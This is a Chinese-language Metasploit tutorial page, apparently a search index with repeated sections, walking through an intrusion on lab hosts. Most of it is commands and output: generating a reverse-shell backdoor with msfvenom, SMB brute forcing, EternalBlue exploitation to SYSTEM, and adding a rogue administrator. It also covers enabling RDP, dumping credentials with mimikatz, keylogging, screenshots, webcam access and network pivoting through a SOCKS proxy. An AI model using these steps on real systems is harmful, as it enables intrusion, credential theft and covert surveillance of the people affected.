\u4e5f\u53ef\u4ee5\u8c03\u7528\u81ea\u5df1\u5199\u7684\u6d4b\u8bd5\u6a21\u5757. \u9009\u5b9a\u9700\u8981\u4f7f\u7528\u7684\u653b\u51fb\u6a21\u5757\u540e, \u53ea\u9700\u8981\u7b80\u5355\u914d\u7f6e\u4e00\u4e9b\u53c2\u6570\u5c31\u80fd\u5b8c\u6210\u9488\u5bf9\u4e00\u4e2a\u6f0f\u6d1e\u7684\u6d4b\u8bd5\u548c\u5229\u7528, \u5c06\u6e17\u900f\u7684\u8fc7\u7a0b\u81ea\u52a8\u5316, \u7b80\u5355\u5316. \u9879\u76ee\u5730\u5740: https://github.com/rapid7/metasploit-framework \u76f8\u5173\u672f\u8bed Exploit: \u653b\u51fb \u901a\u8fc7\u5229\u7528 msf \u811a\u672c\u5bf9\u76ee\u6807\u7cfb\u7edf\u5b9e\u65bd\u7cbe\u51c6\u6253\u51fb\u6216\u6f0f\u6d1e\u9a8c\u8bc1 Payload: \u653b\u51fb\u8f7d\u8377 \u653b\u51fb\u8f7d\u8377\u662f\u5728\u6e17\u900f\u653b\u51fb\u6210\u529f\u540e\u4fc3\u4f7f\u76ee\u6807\u7cfb\u7edf\u8fd0\u884c\u7684\u4e00\u6bb5\u690d\u5165\u4ee3\u7801 Listener: \u76d1\u89c6\u5668 \u751f\u6210\u6728\u9a6c\u4e4b\u540e\u53d1\u7ed9\u53d7\u5bb3\u4e3b\u673a, \u76d1\u542c\u53cd\u5f39\u6728\u9a6c\u8fde\u5165\u672c\u673a \u5e38\u7528\u547d\u4ee4 msfdb msf \u6570\u636e\u5e93\u7ba1\u7406\u5de5\u5177 msfvenom msf \u72ec\u7acb\u6709\u6548\u8d1f\u8f7d\u751f\u6210\u5668, \u4ee3\u66ff\u4e86\u65e7\u7248\u4e2d\u7684 msfpayload \u548c msfencode msfconsole msf \u63a7\u5236\u53f0, \u8c03\u7528\u6a21\u5757, \u5b9e\u65bd\u653b\u51fb Windows \u53cd\u5f39 shell \u751f\u6210\u540e\u95e8\u6587\u4ef6 \u751f\u6210 32\u4f4d\u6587\u4ef6\u53bb\u6389 /x64 \u5373\u53ef \u751f\u6210 linux \u5bf9\u5e94\u6587\u4ef6\u5c06 windows \u4fee\u6539\u4e3a linux , \u8f93\u51fa\u6587\u4ef6\u7c7b\u578b\u4e3a elf , \u4e0d\u9700\u8981 .exe \u540e\u7f00 \u250c\u2500\u2500 ( root\ud83d\udc80kali ) - [ ~ ] \u2514\u2500# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST = 192 .168.32.128 LPORT = 8848 -f exe -o shell.exe [ - ] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [ - ] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 510 bytes Final size of exe file: 7168 bytes Saved as: shell.exe \u5f00\u542f\u76d1\u542c\u7aef\u53e3 \u250c\u2500\u2500 ( root\ud83d\udc80kali ) - [ ~ ] \u2514\u2500# msfconsole msf6 > use exploit/multi/handler [ * ] Using configured payload generic/shell_reverse_tcp msf6 exploit ( multi/handler ) > set payload windows/x64/meterpreter/reverse_tcp payload = > windows/x64/meterpreter/reverse_tcp msf6 exploit ( multi/handler ) > set lhost 192 .168.32.128 lhost = > 192 .168.32.128 msf6 exploit ( multi/handler ) > set lport 8848 lport = > 8848 msf6 exploit ( multi/handler ) > exploit [ * ] Started reverse TCP handler on 192 .168.32.128:8848 \u76ee\u6807\u4e3b\u673a\u4e0a\u7ebf \u901a\u8fc7\u67d0\u4e9b\u65b9\u5f0f\u5c06\u540e\u95e8\u6587\u4ef6\u53d1\u9001\u81f3\u76ee\u6807\u4e3b\u673a\u5e76\u8fd0\u884c, msf \u4f1a\u5f97\u5230\u53cd\u5f39 shell msf6 exploit(multi/handler) > exploit [*] Started reverse TCP handler on 192.168.32.128:8848 [*] Sending stage (200262 bytes) to 192.168.32.130 [*] Meterpreter session 1 opened (192.168.32.128:8848 -> 192.168.32.130:49169) at 2021-07-22 12:26:24 +0800 meterpreter > getuid Server username: Win7_VM\\Administrator \u6f0f\u6d1e\u5229\u7528 \u7aef\u53e3\u626b\u63cf msf6 > use auxiliary/scanner/portscan/tcp msf6 auxiliary ( scanner/portscan/tcp ) > set rhosts 192 .168.32.130 rhosts = > 192 .168.32.130 msf6 auxiliary ( scanner/portscan/tcp ) > set threads 5 threads = > 5 msf6 auxiliary ( scanner/portscan/tcp ) > exploit [ + ] 192 .168.32.130: - 192 .168.32.130:445 - TCP OPEN [ + ] 192 .168.32.130: - 192 .168.32.130:5357 - TCP OPEN [ + ] 192 .168.32.130: - 192 .168.32.130:8900 - TCP OPEN [ * ] 192 .168.32.130: - Scanned 1 of 1 hosts ( 100 % complete ) [ * ] Auxiliary module execution completed SMB \u7206\u7834 msf6 > use auxiliary/scanner/smb/smb_login msf6 auxiliary ( scanner/smb/smb_login ) > set rhosts 192 .168.32.130 rhosts = > 192 .168.32.130 msf6 auxiliary ( scanner/smb/smb_login ) > set smbuser administrator smbuser = > administrator msf6 auxiliary ( scanner/smb/smb_login ) > set pass_file /root/fuzzDicts/passwordDict/top500.txt pass_file = > /root/fuzzDicts/passwordDict/top500.txt msf6 auxiliary ( scanner/smb/smb_login ) > set threads 5 threads = > 5 msf6 auxiliary ( scanner/smb/smb_login ) > exploit ms17-010 \u626b\u63cf msf6 > use auxiliary/scanner/smb/smb_ms17_010 msf6 auxiliary ( scanner/smb/smb_ms17_010 ) > set rhosts 192 .168.32.145 rhosts = > 192 .168.32.145 msf6 auxiliary ( scanner/smb/smb_ms17_010 ) > exploit [ + ] 192 .168.32.146:445 - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 HPC Edition 7601 Service Pack 1 x64 ( 64 -bit ) [ * ] 192 .168.32.146:445 - Scanned 1 of 1 hosts ( 100 % complete ) [ * ] Auxiliary module execution completed ms17-010 \u5229\u7528 msf6 > use exploit/windows/smb/ms17_010_eternalblue [ * ] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp msf6 exploit ( windows/smb/ms17_010_eternalblue ) > set payload windows/x64/meterpreter/reverse_tcp payload = > windows/x64/meterpreter/reverse_tcp msf6 exploit ( windows/smb/ms17_010_eternalblue ) > set rhosts 192 .168.32.130 rhosts = > 192 .168.32.130 msf6 exploit ( windows/smb/ms17_010_eternalblue ) > set lhost 192 .168.32.128 lhost = > 192 .168.32.128 msf6 exploit ( windows/smb/ms17_010_eternalblue ) > exploit [ * ] Started reverse TCP handler on 192 .168.32.128:4444 [ * ] 192 .168.32.130:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check [ + ] 192 .168.32.130:445 - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 HPC Edition 7601 Service Pack 1 x64 ( 64 -bit ) [ * ] 192 .168.32.130:445 - Scanned 1 of 1 hosts ( 100 % complete ) [ + ] 192 .168.32.130:445 - The target is vulnerable. [ * ] 192 .168.32.130:445 - Connecting to target for exploitation. [ + ] 192 .168.32.130:445 - Connection established for exploitation. [ + ] 192 .168.32.130:445 - Target OS selected valid for OS indicated by SMB reply [ * ] 192 .168.32.130:445 - CORE raw buffer dump ( 51 bytes ) [ * ] 192 .168.32.130:445 - 0x00000000 57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32 Windows Server 2 [ * ] 192 .168.32.130:445 - 0x00000010 30 30 38 20 48 50 43 20 45 64 69 74 69 6f 6e 20 008 HPC Edition [ * ] 192 .168.32.130:445 - 0x00000020 37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63 7601 Service Pac [ * ] 192 .168.32.130:445 - 0x00000030 6b 20 31 k 1 [ + ] 192 .168.32.130:445 - Target arch selected valid for arch indicated by DCE/RPC reply [ * ] 192 .168.32.130:445 - Trying exploit with 12 Groom Allocations. [ * ] 192 .168.32.130:445 - Sending all but last fragment of exploit packet [ * ] 192 .168.32.130:445 - Starting non-paged pool grooming [ + ] 192 .168.32.130:445 - Sending SMBv2 buffers [ + ] 192 .168.32.130:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer. [ * ] 192 .168.32.130:445 - Sending final SMBv2 buffers. [ * ] 192 .168.32.130:445 - Sending last fragment of exploit packet! [ * ] 192 .168.32.130:445 - Receiving response from exploit packet [ + ] 192 .168.32.130:445 - ETERNALBLUE overwrite completed successfully ( 0xC000000D ) ! [ * ] 192 .168.32.130:445 - Sending egg to corrupted connection. [ * ] 192 .168.32.130:445 - Triggering free of corrupted buffer. [ - ] 192 .168.32.130:445 - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = [ - ] 192 .168.32.130:445 - = - = - = - = - = - = - = - = - = - = - = - = - = - = FAIL- = - = - = - = - = - = - = - = - = - = - = - = - = - = - = [ - ] 192 .168.32.130:445 - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = [ * ] 192 .168.32.130:445 - Connecting to target for exploitation. [ + ] 192 .168.32.130:445 - Connection established for exploitation. [ + ] 192 .168.32.130:445 - Target OS selected valid for OS indicated by SMB reply [ * ] 192 .168.32.130:445 - CORE raw buffer dump ( 51 bytes ) [ * ] 192 .168.32.130:445 - 0x00000000 57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32 Windows Server 2 [ * ] 192 .168.32.130:445 - 0x00000010 30 30 38 20 48 50 43 20 45 64 69 74 69 6f 6e 20 008 HPC Edition [ * ] 192 .168.32.130:445 - 0x00000020 37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63 7601 Service Pac [ * ] 192 .168.32.130:445 - 0x00000030 6b 20 31 k 1 [ + ] 192 .168.32.130:445 - Target arch selected valid for arch indicated by DCE/RPC reply [ * ] 192 .168.32.130:445 - Trying exploit with 17 Groom Allocations. [ * ] 192 .168.32.130:445 - Sending all but last fragment of exploit packet [ * ] 192 .168.32.130:445 - Starting non-paged pool grooming [ + ] 192 .168.32.130:445 - Sending SMBv2 buffers [ + ] 192 .168.32.130:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer. [ * ] 192 .168.32.130:445 - Sending final SMBv2 buffers. [ * ] 192 .168.32.130:445 - Sending last fragment of exploit packet! [ * ] 192 .168.32.130:445 - Receiving response from exploit packet [ + ] 192 .168.32.130:445 - ETERNALBLUE overwrite completed successfully ( 0xC000000D ) ! [ * ] 192 .168.32.130:445 - Sending egg to corrupted connection. [ * ] 192 .168.32.130:445 - Triggering free of corrupted buffer. [ * ] Sending stage ( 200262 bytes ) to 192 .168.32.130 [ * ] Sending stage ( 200262 bytes ) to 192 .168.32.130 [ * ] Meterpreter session 3 opened ( 192 .168.32.128:4444 -> 192 .168.32.130:49169 ) at 2021 -07-23 14 :07:02 +0800 [ * ] Meterpreter session 2 opened ( 192 .168.32.128:4444 -> 192 .168.32.130:49168 ) at 2021 -07-23 14 :07:02 +0800 [ + ] 192 .168.32.130:445 - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = [ + ] 192 .168.32.130:445 - = - = - = - = - = - = - = - = - = - = - = - = - = -WIN- = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = [ + ] 192 .168.32.130:445 - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = meterpreter > getuid Server username: NT AUTHORITY \\S YSTEM Win \u6e17\u900f\u540e\u601d\u8def cmd \u4e71\u7801\u53ef\u4ee5\u901a\u8fc7 chcp 65001 \u4fee\u6539 \u67e5\u770b\u7528\u6237 net user \u6dfb\u52a0\u7528\u6237 net user USERNAME PASSWORD /add \u6dfb\u52a0\u7528\u6237\u5230\u7ba1\u7406\u5458\u7ec4 net localgroup administrators USERNAME /add \u6dfb\u52a0\u7528\u6237 meterpreter > shell Process 1272 created. Channel 2 created. Microsoft Windows [ Version 6 .1.7601 ] Copyright ( c ) 2009 Microsoft Corporation. All rights reserved. C: \\W indows \\s ystem32>net user net user User accounts for \\\\ ------------------------------------------------------------------------------- Administrator Guest The command completed with one or more errors. C: \\W indows \\s ystem32>net user root R00t2o21 /add net user root R00t2o21 /add The command completed successfully. C: \\W indows \\s ystem32>net user net user User accounts for \\\\ ------------------------------------------------------------------------------- Administrator Guest root The command completed with one or more errors. C: \\W indows \\s ystem32>net localgroup administrators net localgroup administrators Alias name administrators Comment \u2592\u2592\u2592\u2592\u0531\u2592\u053c\u2592\u2592\u2592\u2592/\u2592\u2592\u2592\u0432\u2592\u2592\u2592\u2592\u2592\u2592\u01b5\u2592\u2592\u2592\u022b\u2592\u2592\u2592\u2592\u0228 Members ------------------------------------------------------------------------------- Administrator The command completed successfully. C: \\W indows \\s ystem32>net localgroup administrators root /add net localgroup administrators root /add The command completed successfully. C: \\W indows \\s ystem32>net localgroup administrators net localgroup administrators Alias name administrators Comment \u2592\u2592\u2592\u2592\u0531\u2592\u053c\u2592\u2592\u2592\u2592/\u2592\u2592\u2592\u0432\u2592\u2592\u2592\u2592\u2592\u2592\u01b5\u2592\u2592\u2592\u022b\u2592\u2592\u2592\u2592\u0228 Members ------------------------------------------------------------------------------- Administrator root The command completed successfully. \u5f00\u542f\u8fdc\u7a0b\u684c\u9762 C:\\Windows\\system32>netstat -an netstat -an netstat -an Active Connections Proto Local Address Foreign Address State TCP 0.0.0.0:135 0.0.0.0:0 LISTENING TCP 0.0.0.0:445 0.0.0.0:0 LISTENING TCP 0.0.0.0:47001 0.0.0.0:0 LISTENING TCP 0.0.0.0:49152 0.0.0.0:0 LISTENING TCP 0.0.0.0:49153 0.0.0.0:0 LISTENING TCP 0.0.0.0:49154 0.0.0.0:0 LISTENING TCP 0.0.0.0:49155 0.0.0.0:0 LISTENING TCP 0.0.0.0:49156 0.0.0.0:0 LISTENING TCP 192.168.32.130:139 0.0.0.0:0 LISTENING TCP 192.168.32.130:49174 192.168.32.128:4444 ESTABLISHED TCP 192.168.32.130:49175 192.168.32.128:4444 ESTABLISHED TCP [::]:135 [::]:0 LISTENING TCP [::]:445 [::]:0 LISTENING TCP [::]:47001 [::]:0 LISTENING TCP [::]:49152 [::]:0 LISTENING TCP [::]:49153 [::]:0 LISTENING TCP [::]:49154 [::]:0 LISTENING TCP [::]:49155 [::]:0 LISTENING TCP [::]:49156 [::]:0 LISTENING UDP 0.0.0.0:5355 *:* UDP 192.168.32.130:137 *:* UDP 192.168.32.130:138 *:* UDP [::]:5355 *:* C:\\Windows\\system32>exit meterpreter > run post/windows/manage/enable_rdp [*] Enabling Remote Desktop [*] RDP is disabled; enabling it ... [*] Setting Terminal Services service startup mode [*] The Terminal Services service is not set to auto, changing it to auto ... [*] Opening port in local firewall if necessary [*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20210723151640_default_192.168.32.146_host.windows.cle_977805.txt C:\\Windows\\system32>netstat -an netstat -an Active Connections Proto Local Address Foreign Address State TCP 0.0.0.0:135 0.0.0.0:0 LISTENING TCP 0.0.0.0:445 0.0.0.0:0 LISTENING TCP 0.0.0.0:3389 0.0.0.0:0 LISTENING TCP 0.0.0.0:47001 0.0.0.0:0 LISTENING TCP 0.0.0.0:49152 0.0.0.0:0 LISTENING TCP 0.0.0.0:49153 0.0.0.0:0 LISTENING TCP 0.0.0.0:49154 0.0.0.0:0 LISTENING TCP 0.0.0.0:49155 0.0.0.0:0 LISTENING TCP 0.0.0.0:49156 0.0.0.0:0 LISTENING TCP 192.168.32.130:139 0.0.0.0:0 LISTENING TCP 192.168.32.130:49158 192.168.32.128:4444 ESTABLISHED TCP [::]:135 [::]:0 LISTENING TCP [::]:445 [::]:0 LISTENING TCP [::]:3389 [::]:0 LISTENING TCP [::]:47001 [::]:0 LISTENING TCP [::]:49152 [::]:0 LISTENING TCP [::]:49153 [::]:0 LISTENING TCP [::]:49154 [::]:0 LISTENING TCP [::]:49155 [::]:0 LISTENING TCP [::]:49156 [::]:0 LISTENING UDP 0.0.0.0:5355 *:* UDP 192.168.32.130:137 *:* UDP 192.168.32.130:138 *:* UDP [::]:5355 *:* UDP [fe80::60e3:cb71:9810:3edd%11]:546 *:* \u5c1d\u8bd5\u83b7\u53d6\u7528\u5bc6\u7801 meterpreter > load kiwi Loading extension kiwi... .#####. mimikatz 2 .2.0 20191125 ( x64/windows ) .## ^ ##. \"A La Vie, A L'Amour\" - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## > http://blog.gentilkiwi.com/mimikatz '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) '#####' > http://pingcastle.com / http://mysmartlogon.com ***/ Success. meterpreter > creds_all [ + ] Running as SYSTEM [ * ] Retrieving all credentials wdigest credentials =================== Username Domain Password -------- ------ -------- ( null ) ( null ) ( null ) WIN-RB49N4UMHO0$ WORKGROUP ( null ) kerberos credentials ==================== Username Domain Password -------- ------ -------- ( null ) ( null ) ( null ) win-rb49n4umho0$ WORKGROUP ( null ) meterpreter \u5176\u4ed6\u547d\u4ee4 \u67e5\u770b\u7cfb\u7edf\u4fe1\u606f meterpreter > sysinfo Computer : WIN-RB49N4UMHO0 OS : Windows 2008 R2 ( 6 .1 Build 7601 , Service Pack 1 ) . Architecture : x64 System Language : zh_CN Domain : WORKGROUP Logged On Users : 1 Meterpreter : x64/windows \u5c4f\u5e55\u622a\u56fe \u76ee\u6807\u7cfb\u7edf\u5c4f\u5e55\u622a\u56fe\u76f4\u63a5\u53d1\u9001\u5230\u88c5\u6709 msf \u7684\u4e3b\u673a meterpreter > screenshot Screenshot saved to: /root/wIeuGWMF.jpeg \u63d0\u6743 \u5c1d\u8bd5\u83b7\u53d6 system \u6743\u9650, \u4e0d\u4e00\u5b9a\u6210\u529f meterpreter > getsystem ...got system via technique 1 ( Named Pipe Impersonation ( In Memory/Admin )) . \u952e\u76d8\u8bb0\u5f55 meterpreter > keyscan_start Starting the keystroke sniffer ... meterpreter > keyscan_stop Stopping the keystroke sniffer... meterpreter > keyscan_dump Dumping captured keystrokes... \u5f00\u542f\u6444\u50cf\u5934 meterpreter > webcam_stream [ - ] Target does not have a webcam \u4e0a\u4f20\u4e0b\u8f7d meterpreter > upload /root/shell.exe C:/windows [ * ] uploading : /root/shell.exe -> C:/windows [ * ] uploaded : /root/shell.exe -> C:/windows \\s hell.exe meterpreter > download C:/windows/regedit.exe [ * ] Downloading: C:/windows/regedit.exe -> /root/regedit.exe [ * ] Downloaded 417 .00 KiB of 417 .00 KiB ( 100 .0% ) : C:/windows/regedit.exe -> /root/regedit.exe [ * ] download : C:/windows/regedit.exe -> /root/regedit.exe \u8def\u7531\u8f6c\u53d1 \u8def\u7531\u914d\u7f6e\u540e\u53ef\u4ee5\u4f7f\u7528 background \u6302\u8d77, \u8fd4\u56de msf \u4f7f\u7528\u5bf9\u5e94\u6a21\u5757 meterpreter > run autoroute -p [ ! ] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute. [ ! ] Example: run post/multi/manage/autoroute OPTION = value [ ... ] [ - ] Could not execute autoroute: ArgumentError wrong number of arguments ( given 2 , expected 0 ..1 ) meterpreter > run autoroute -s 192 .168.128.0/24 meterpreter > run post/windows/gather/arp_scanner rhosts = 192 .168.128.0/24 [ * ] Running module against WIN-RB49N4UMHO0 [ * ] ARP Scanning 192 .168.128.0/24 meterpreter > run auxiliary/scanner/portscan/tcp rhosts = 192 .168.128.1 [ + ] 192 .168.128.1: - 192 .168.128.1:25 - TCP OPEN [ + ] 192 .168.128.1: - 192 .168.128.1:110 - TCP OPEN \u4ee3\u7406 meterpreter > run autoroute -s 192 .168.128.0/24 meterpreter > background msf6 exploit ( windows/smb/ms17_010_eternalblue ) > back msf6 > use auxiliary/server/socks_proxy msf6 auxiliary ( server/socks_proxy ) > set srvhost 192 .168.32.128 srvhost = > 192 .168.32.128 msf6 auxiliary ( server/socks_proxy ) > exploit [ * ] Auxiliary module running as background job 0 . msf6 auxiliary ( server/socks_proxy ) > [ * ] Starting the SOCKS proxy server \u901a\u8fc7 proxychains \u8bbe\u7f6e msf \u4ee3\u7406\u5730\u5740\u4f7f nmap \u7b49\u5de5\u5177\u5bf9\u76ee\u6807\u5185\u7f51\u6e17\u900f proxychains nnmap -sT -sV -Pn -n -p22,80,135,139,445,3306 --script = smb-vuln-ms17-010.nse","title":"Metasploit-Framework \u7b80\u4ecb"},{"location":"tools/msf/#metasploit-framework","text":"Metasploit \u662f\u4e00\u6b3e\u5f00\u6e90\u6e17\u900f\u6d4b\u8bd5\u6846\u67b6\u5e73\u53f0, \u5230\u76ee\u524d\u4e3a\u6b62, msf \u5df2\u7ecf\u5185\u7f6e\u6570\u5343\u4e2a\u5df2\u62ab\u9732\u7684\u6f0f\u6d1e\u76f8\u5173\u7684\u6a21\u5757\u548c\u6e17\u900f\u6d4b\u8bd5\u5de5\u5177, \u6a21\u5757\u4f7f\u7528 ruby \u8bed\u8a00\u7f16\u5199, \u4f7f\u7528\u8005\u80fd\u591f\u6839\u636e\u9700\u8981\u5bf9\u6a21\u5757\u8fdb\u884c\u9002\u5f53\u4fee\u6539, \u4e5f\u53ef\u4ee5\u8c03\u7528\u81ea\u5df1\u5199\u7684\u6d4b\u8bd5\u6a21\u5757. \u9009\u5b9a\u9700\u8981\u4f7f\u7528\u7684\u653b\u51fb\u6a21\u5757\u540e, \u53ea\u9700\u8981\u7b80\u5355\u914d\u7f6e\u4e00\u4e9b\u53c2\u6570\u5c31\u80fd\u5b8c\u6210\u9488\u5bf9\u4e00\u4e2a\u6f0f\u6d1e\u7684\u6d4b\u8bd5\u548c\u5229\u7528, \u5c06\u6e17\u900f\u7684\u8fc7\u7a0b\u81ea\u52a8\u5316, \u7b80\u5355\u5316. \u9879\u76ee\u5730\u5740: https://github.com/rapid7/metasploit-framework","title":"Metasploit-Framework \u7b80\u4ecb"},{"location":"tools/msf/#_1","text":"Exploit: \u653b\u51fb \u901a\u8fc7\u5229\u7528 msf \u811a\u672c\u5bf9\u76ee\u6807\u7cfb\u7edf\u5b9e\u65bd\u7cbe\u51c6\u6253\u51fb\u6216\u6f0f\u6d1e\u9a8c\u8bc1 Payload: \u653b\u51fb\u8f7d\u8377 \u653b\u51fb\u8f7d\u8377\u662f\u5728\u6e17\u900f\u653b\u51fb\u6210\u529f\u540e\u4fc3\u4f7f\u76ee\u6807\u7cfb\u7edf\u8fd0\u884c\u7684\u4e00\u6bb5\u690d\u5165\u4ee3\u7801 Listener: \u76d1\u89c6\u5668 \u751f\u6210\u6728\u9a6c\u4e4b\u540e\u53d1\u7ed9\u53d7\u5bb3\u4e3b\u673a, \u76d1\u542c\u53cd\u5f39\u6728\u9a6c\u8fde\u5165\u672c\u673a","title":"\u76f8\u5173\u672f\u8bed"},{"location":"tools/msf/#_2","text":"msfdb msf \u6570\u636e\u5e93\u7ba1\u7406\u5de5\u5177 msfvenom msf \u72ec\u7acb\u6709\u6548\u8d1f\u8f7d\u751f\u6210\u5668, \u4ee3\u66ff\u4e86\u65e7\u7248\u4e2d\u7684 msfpayload \u548c msfencode msfconsole msf \u63a7\u5236\u53f0, \u8c03\u7528\u6a21\u5757, \u5b9e\u65bd\u653b\u51fb","title":"\u5e38\u7528\u547d\u4ee4"},{"location":"tools/msf/#windows-shell","text":"","title":"Windows \u53cd\u5f39 shell"},{"location":"tools/msf/#_3","text":"\u751f\u6210 32\u4f4d\u6587\u4ef6\u53bb\u6389 /x64 \u5373\u53ef \u751f\u6210 linux \u5bf9\u5e94\u6587\u4ef6\u5c06 windows \u4fee\u6539\u4e3a linux , \u8f93\u51fa\u6587\u4ef6\u7c7b\u578b\u4e3a elf , \u4e0d\u9700\u8981 .exe \u540e\u7f00 \u250c\u2500\u2500 ( root\ud83d\udc80kali ) - [ ~ ] \u2514\u2500# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST = 192 .168.32.128 LPORT = 8848 -f exe -o shell.exe [ - ] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [ - ] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 510 bytes Final size of exe file: 7168 bytes Saved as: shell.exe","title":"\u751f\u6210\u540e\u95e8\u6587\u4ef6"},{"location":"tools/msf/#_4","text":"\u250c\u2500\u2500 ( root\ud83d\udc80kali ) - [ ~ ] \u2514\u2500# msfconsole msf6 > use exploit/multi/handler [ * ] Using configured payload generic/shell_reverse_tcp msf6 exploit ( multi/handler ) > set payload windows/x64/meterpreter/reverse_tcp payload = > windows/x64/meterpreter/reverse_tcp msf6 exploit ( multi/handler ) > set lhost 192 .168.32.128 lhost = > 192 .168.32.128 msf6 exploit ( multi/handler ) > set lport 8848 lport = > 8848 msf6 exploit ( multi/handler ) > exploit [ * ] Started reverse TCP handler on 192 .168.32.128:8848","title":"\u5f00\u542f\u76d1\u542c\u7aef\u53e3"},{"location":"tools/msf/#_5","text":"\u901a\u8fc7\u67d0\u4e9b\u65b9\u5f0f\u5c06\u540e\u95e8\u6587\u4ef6\u53d1\u9001\u81f3\u76ee\u6807\u4e3b\u673a\u5e76\u8fd0\u884c, msf \u4f1a\u5f97\u5230\u53cd\u5f39 shell msf6 exploit(multi/handler) > exploit [*] Started reverse TCP handler on 192.168.32.128:8848 [*] Sending stage (200262 bytes) to 192.168.32.130 [*] Meterpreter session 1 opened (192.168.32.128:8848 -> 192.168.32.130:49169) at 2021-07-22 12:26:24 +0800 meterpreter > getuid Server username: Win7_VM\\Administrator","title":"\u76ee\u6807\u4e3b\u673a\u4e0a\u7ebf"},{"location":"tools/msf/#_6","text":"","title":"\u6f0f\u6d1e\u5229\u7528"},{"location":"tools/msf/#_7","text":"msf6 > use auxiliary/scanner/portscan/tcp msf6 auxiliary ( scanner/portscan/tcp ) > set rhosts 192 .168.32.130 rhosts = > 192 .168.32.130 msf6 auxiliary ( scanner/portscan/tcp ) > set threads 5 threads = > 5 msf6 auxiliary ( scanner/portscan/tcp ) > exploit [ + ] 192 .168.32.130: - 192 .168.32.130:445 - TCP OPEN [ + ] 192 .168.32.130: - 192 .168.32.130:5357 - TCP OPEN [ + ] 192 .168.32.130: - 192 .168.32.130:8900 - TCP OPEN [ * ] 192 .168.32.130: - Scanned 1 of 1 hosts ( 100 % complete ) [ * ] Auxiliary module execution completed","title":"\u7aef\u53e3\u626b\u63cf"},{"location":"tools/msf/#smb","text":"msf6 > use auxiliary/scanner/smb/smb_login msf6 auxiliary ( scanner/smb/smb_login ) > set rhosts 192 .168.32.130 rhosts = > 192 .168.32.130 msf6 auxiliary ( scanner/smb/smb_login ) > set smbuser administrator smbuser = > administrator msf6 auxiliary ( scanner/smb/smb_login ) > set pass_file /root/fuzzDicts/passwordDict/top500.txt pass_file = > /root/fuzzDicts/passwordDict/top500.txt msf6 auxiliary ( scanner/smb/smb_login ) > set threads 5 threads = > 5 msf6 auxiliary ( scanner/smb/smb_login ) > exploit","title":"SMB \u7206\u7834"},{"location":"tools/msf/#ms17-010","text":"msf6 > use auxiliary/scanner/smb/smb_ms17_010 msf6 auxiliary ( scanner/smb/smb_ms17_010 ) > set rhosts 192 .168.32.145 rhosts = > 192 .168.32.145 msf6 auxiliary ( scanner/smb/smb_ms17_010 ) > exploit [ + ] 192 .168.32.146:445 - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 HPC Edition 7601 Service Pack 1 x64 ( 64 -bit ) [ * ] 192 .168.32.146:445 - Scanned 1 of 1 hosts ( 100 % complete ) [ * ] Auxiliary module execution completed","title":"ms17-010 \u626b\u63cf"},{"location":"tools/msf/#ms17-010_1","text":"msf6 > use exploit/windows/smb/ms17_010_eternalblue [ * ] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp msf6 exploit ( windows/smb/ms17_010_eternalblue ) > set payload windows/x64/meterpreter/reverse_tcp payload = > windows/x64/meterpreter/reverse_tcp msf6 exploit ( windows/smb/ms17_010_eternalblue ) > set rhosts 192 .168.32.130 rhosts = > 192 .168.32.130 msf6 exploit ( windows/smb/ms17_010_eternalblue ) > set lhost 192 .168.32.128 lhost = > 192 .168.32.128 msf6 exploit ( windows/smb/ms17_010_eternalblue ) > exploit [ * ] Started reverse TCP handler on 192 .168.32.128:4444 [ * ] 192 .168.32.130:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check [ + ] 192 .168.32.130:445 - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 HPC Edition 7601 Service Pack 1 x64 ( 64 -bit ) [ * ] 192 .168.32.130:445 - Scanned 1 of 1 hosts ( 100 % complete ) [ + ] 192 .168.32.130:445 - The target is vulnerable. [ * ] 192 .168.32.130:445 - Connecting to target for exploitation. [ + ] 192 .168.32.130:445 - Connection established for exploitation. [ + ] 192 .168.32.130:445 - Target OS selected valid for OS indicated by SMB reply [ * ] 192 .168.32.130:445 - CORE raw buffer dump ( 51 bytes ) [ * ] 192 .168.32.130:445 - 0x00000000 57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32 Windows Server 2 [ * ] 192 .168.32.130:445 - 0x00000010 30 30 38 20 48 50 43 20 45 64 69 74 69 6f 6e 20 008 HPC Edition [ * ] 192 .168.32.130:445 - 0x00000020 37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63 7601 Service Pac [ * ] 192 .168.32.130:445 - 0x00000030 6b 20 31 k 1 [ + ] 192 .168.32.130:445 - Target arch selected valid for arch indicated by DCE/RPC reply [ * ] 192 .168.32.130:445 - Trying exploit with 12 Groom Allocations. [ * ] 192 .168.32.130:445 - Sending all but last fragment of exploit packet [ * ] 192 .168.32.130:445 - Starting non-paged pool grooming [ + ] 192 .168.32.130:445 - Sending SMBv2 buffers [ + ] 192 .168.32.130:445 - Closing SMBv1 